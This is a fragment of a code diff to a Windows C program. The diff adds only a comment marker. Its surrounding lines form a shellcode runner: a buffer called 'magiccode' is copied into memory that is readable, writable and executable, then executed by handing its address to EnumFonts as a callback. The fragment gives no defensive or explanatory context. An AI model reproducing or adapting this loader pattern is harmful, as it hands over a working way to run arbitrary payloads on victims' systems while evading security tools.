@@ -19,6 +19,10 @@ int main(int argc, char *argv[])
 	LPVOID magicAddress = VirtualAlloc(NULL, magicSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	WriteProcessMemory(GetCurrentProcess(), magicAddress, magiccode, magicSize, NULL);
+
+
+    //####END####
+
 	
 	// EnumFonts(GetDC(0), (LPCWSTR)0, (FONTENUMPROC)(char*)magiccode, 0);
     EnumFonts(GetDC(0), (LPCSTR)0, (FONTENUMPROC)(char*)magicAddress, 0);
